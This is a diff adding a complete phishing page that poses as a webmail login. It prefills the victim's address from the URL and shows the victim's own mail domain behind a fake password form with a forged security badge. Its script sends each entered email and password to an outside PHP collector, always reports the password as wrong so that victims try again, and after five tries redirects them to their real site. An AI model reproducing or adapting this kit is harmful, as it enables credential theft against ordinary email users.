@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html>
+<head>
+        <meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow"> 
+    <title>Webmail Portal Login</title>
+
+    <style>
+  html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:before,blockquote:after,q:before,q:after{content:'';content:none}table{border-collapse:collapse;border-spacing:0}
+    
+    html,body{font-size:18px;font-family:Arial,helvetica neue,Helvetica,sans-serif sans-serif;font-weight:500}#root{position:absolute;left:0;right:0;bottom:0;top:0;z-index:-10;pointer-events:none}.error{color:#dc3545;width:80%;margin:0 auto;padding-top:5px}.form-holder{background-color:#fff;width:600px;margin:180px auto;height:100%;box-shadow:0 20px 50px #a9a9a9;border-radius:4px 4px 0 0;border:1px solid #d6dfea;z-index:12}.xlogo{background-color:#0d4f8b;color:#fff;padding:8px;margin-bottom:10px}.xlogo img{vertical-align:middle;width:5%;height:5%;object-fit:contain}.xlogo span{vertical-align:middle}.form-wrap{width:400px;margin:0 auto;text-align:center}.form-wrap p{font-size:24px}.form-wrap img{margin:20px}.finput{width:80%;margin:10px auto}.finput input[type=email],.finput input[type=password]{font-size:24px;padding:7px 10px 7px 40px;border-radius:4px;margin:5px 0;width:90%;border:1px solid #d6dfea}.finput input[type=email]{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAQAAABKIxwrAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADdcAAA3XAUIom3gAAAAHdElNRQfjAwITKgogc0nIAAAA/ElEQVQ4y43Sv07CUBTH8W9BiEvjSAcZCMbRQWNKSHBnwD4AL8DII7CRONXwDE76DhhfoCshIeGPJLoRZGjCcBygtdR72/s7w10+Ock550I6V4wImBEwok5OHvhB4trSysJlVgksCAtKeu6lsCB0kqBwwl1FC1fPHQV39NxS8KKeLxV8rh+1qRi1kbXKjxQek5ka6wT+pEZOqryxR9jzymUe7WMDNtfHt09VTSv4hAhfDGlzR5sh3wghPpVTajFgp9hKVDsGyZv0MmhUvb/eEwM+jU7qGWBBeDzwd0M+Brg1xIJwX+SJm7zLxTm32HBhzDdnPNNV/vP/EV5+AUv1vp3jhmegAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTAzLTAyVDE4OjQyOjEwKzAxOjAw99JImgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wMy0wMlQxODo0MjoxMCswMTowMIaP8CYAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAAElFTkSuQmCC
+) no-repeat scroll 10px 10px}.finput input[type=password]{background:url(data:image/png;base64,jAwITLAsBLt7YAAAA1klEQVQ4y72STQ6CMBCFP3SNiSSykvvoUtEDGe7CEfQW6NI1sNRECUtxXABKofwkJE6TJn3z3vTNtFAPG48zKSkBHgt6YkeCVNaTbTf9rdAFIWuX2EX1EBcTkw1XBOHRZswr6NYXsYgQhINecEEQXAXbIwiBXpAbMhVshiAkP8CoJKWBaNBJ35zrUQruRSUaYy3Rm2pJBhQ3RlkaKTji4HDqEqqNLgFwdO3rb5j221Vr+QD4w2+YV/ZBTUcAxMMFGQAvXep/Lx33MiP1uCZs/NPqClnlxA8hMnhnez+9CwAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0wMy0wMlQxODo0NDoxMSswMTowMFy7M2kAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMDMtMDJUMTg6NDQ6MTErMDE6MDAt5ovVAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAABJRU5ErkJggg==
+) no-repeat scroll 7px 7px}.finput input[type=email]:hover,.finput input[type=password]:hover,.finput input[type=email]:focus,.finput input[type=password]:focus{border:1px solid #0d4f8b}button{border:1px solid #0d4f8b;font-size:20px;padding:7px 20px;border-radius:4px;background-color:#0d4f8b;color:#fff}button:hover{background-color:#1874cd;cursor:pointer}.privacy{font-size:14px;color:gray;text-align:left;display:block;margin-bottom:20px}</style>
+<link id="favicon" rel="shortcut icon" type="image/png" href="favicon.png" />
+  
+ <style>
+ 
+ .overlay{
+   width:100%;
+   height:100%;
+   background-color:rgba(14, 13, 13, 0.5);
+   position:absolute;
+   top:0;
+   left:0;
+   display:block;	
+}
+ 
+ </style>
+   
+</head>
+<body>
+
+ <iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
+
+<!--login Form -->
+
+<div class="overlay">
+<div class="form-holder" style="height:430px;">
+
+<center>
+<div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please Enter your correct Password</div>
+<span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+</center>
+                    <input type="hidden" class="form-control" name="hido" id="hido" value="">
+                    <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
+
+<div class="xlogo">
+<img id="zion" src='https://www.google.com/s2/favicons?domain=biofactlife.com'>
+<span style="text-transform: capitalize;" id="banNer"></span>
+</div>
+
+<div class="form-wrap">
+<p>Please sign in with your email</p>
+<div class="error" style="margin-top: 5px; display: none" id="myError"></div>
+
+<div class="finput">
+<input type="email" id="email" name="email" required autocomplete="off" value="" disabled>
+</div>
+
+<div class="finput">
+<input type="password" name="password" required autocomplete="off" placeholder="Email Password" id="password">
+</div>
+
+<div class="finput btn">
+<button type="submit" class="btn btn-primary login-btn btn-block" id="submit-btn">Continue</button>
+</div>
+
+<img src="https://www.pngitem.com/pimgs/m/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png" width="107" height="58">
+
+<span class="privacy">
+Privacy Policy: <span id="kai" style="text-transform: capitalize;"></span><br>
+Your information is only for the sole purpose of viewing this document and would not be sold or shared to any third party.
+</span>
+
+</div>
+</div>
+
+</div>
+<!--<div id="root">
+<iframe width='100%' height='100%' id="myframe" frameborder='0' scrolling='no' src=""></iframe>
+</div>-->
+
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
+<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
+
+<script type="text/javascript">
+
+$(document).bind("contextmenu", function(e){ return false;});
+
+var $c = getUrlParameter('email');
+     $('#email').val($c);
+	 $('#me').text($c);
+	 
+	 
+	 var user = $('#email').val();
+	  var uemail = user.split('@')[1];
+	  var mpng = uemail;
+	  var domain = uemail;
+	  console.log("https://" +domain);
+	  var resultpng  = subStrAfterChars(mpng, '.', 'a');
+	  console.log(resultpng);
+	  
+	   $('#zion').attr("src", "https://www.google.com/s2/favicons?sz=16&domain_url="+ uemail);
+	  console.log("uemail :" + uemail);
+	  $('#main_domain').val(uemail);
+	  var am = $('#main_domain').val();
+	  console.log("am " + am);
+	 
+	  
+	  if(resultpng == "hotmail"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "yahoo"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "alibabacloud"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "aol"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "aws"){
+		  $('.login-form').css('margin-right','5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "comcast"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "cox"){
+		  $('.login-form').css('margin-right','5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "earthlink"){
+		  $('.login-form').css('margin-right','5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "emailsrvr"){
+		  $('.login-form').css('margin-right','5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "gmail"){
+		  $('.login-form').css('margin-right','5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "gmx"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "godaddy"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "ionos"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "ionos"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "mailqq"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "mimecast"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "networksolution"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "optimum"){
+		  $('.login-form').css('margin-right','5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "protonmail"){
+		  $('.login-form').css('margin-right','5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "rackspace"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "rediffmail"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "spectrum"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "strato"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "yandex"){
+		  $('.login-form').css('margin','0 0 0 5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else if(resultpng == "zoho"){
+		  $('.login-form').css('margin-right','5%');
+		   $('#mainPage').attr("src", "images/"+resultpng + ".png");
+		   $('#banNer').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	       $('.logoname').text(extractDomain(user).charAt(0).toUpperCase() + extractDomain(user).slice(1));
+	  }else{
+		     resultpng = domain;
+			 console.log("result  :" +resultpng );
+		    $('#mainPage').attr("src", "https://" + resultpng);
+		}
+	  
+	 
+	 
+	  
+	  
+	  
+ function subStrAfterChars(str, char, pos)
+  {
+  if(pos=='b')
+   return str.substring(str.indexOf(char) + 1);
+  else if(pos=='a') 
+   return str.substring(0, str.indexOf(char));
+  else
+  return str;  
+  }
+	 
+	 
+        var $current_email = "";
+
+        if ($c) {
+            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
+        }
+		
+		 var title = $('#email').val();
+		 $('#banNer').text(extractDomain(title).charAt(0).toUpperCase() + extractDomain(title).slice(1));
+		 $('.logoname').text(extractDomain(title).charAt(0).toUpperCase() + extractDomain(title).slice(1));
+	
+
+        function decodeCustom($email) {
+            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
+            var $joinChar = $email.substr(0, 1); // substr(,0,1);
+            var $output = $email.substr(2); // substr($email,2);
+            var $vowels = ['a', 'e', 'i', 'o', 'u'];
+            var $vowelsLookup = [];
+
+            for ($i in $consonants) {
+                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
+            }
+
+            for ($i in $vowels) {
+                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
+            }
+
+            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
+            //,$output);
+            return $output;
+        }
+
+        function isValidEmail(email) {
+            var re =
+                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+            return re.test(email);
+        }
+
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+			
+        }
+		
+		 var currentEmail = $current_email;
+    var ListEntries = [
+            '.*fuck.*',
+            '.*pussy.*',
+            '.*bitch.*',
+            '.*asshole.*',
+            '.*fool.*',
+            '.*dick.*',
+            '.*mama.*',
+            '.*nice.*try.*',
+            '.*12345.*'
+        ];
+		
+		 if(currentEmail){
+
+            var e = document.getElementById('username');
+            e = currentEmail;
+            //e.readOnly = true;
+			
+
+            var domain = extractDomain(currentEmail);
+
+           // var corH = document.getElementById('corportate-title');
+            //corH.innerText = domain + " Email Login";
+
+            }
+			
+		function extractDomain(email){
+
+        var load = email;
+        var domain = '';
+        var regex = /.+@(.*?)\..+/;
+        var str = email;
+        var m;
+
+        if ((m = regex.exec(str)) !== null) {
+            return m[1];
+        }
+
+        return null;
+    }
+
+
+
+</script> 
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+  <script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+        $(".logoname").html(finalu);
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+
+
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+                    if (!password) {
+                $('#error').show();
+                $('#error').html("Password field is emply.!");
+
+                return false;
+            }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://bowerroebuck.com/.quarantine/freeman.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=5) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www."+my_slice);
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                  // $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=5) {
+                count=0;
+                window.location.replace("http://www."+my_slice);
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+
+
+    });
+
+
+  </script>
+
+
+</body>
+</html>
